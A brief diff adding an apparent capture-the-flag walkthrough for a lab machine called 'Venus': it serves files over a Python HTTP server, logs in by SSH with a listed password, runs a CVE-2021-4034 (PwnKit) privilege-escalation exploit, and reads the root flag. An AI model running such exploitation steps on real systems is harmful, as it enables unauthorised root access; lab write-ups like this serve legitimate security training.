@@ -1,0 +1,21 @@
+Venus 
+=======
+
+Run this command in the one shell of kali
+=========================================
+python3 -m http.server 8000
+
+And then Access the venus
+==========================
+# 1. SSH into the target
+ssh magellan@192.168.43.240
+Pass: venusiangeology1989
+
+# 2. Navigate to exploit directory (if it still exists)
+cd CVE-2021-4034-main
+
+# 3. Execute the exploit
+./cve-2021-4034
+
+# 4. Get the root flag
+cd /root && cat root_flag.txt
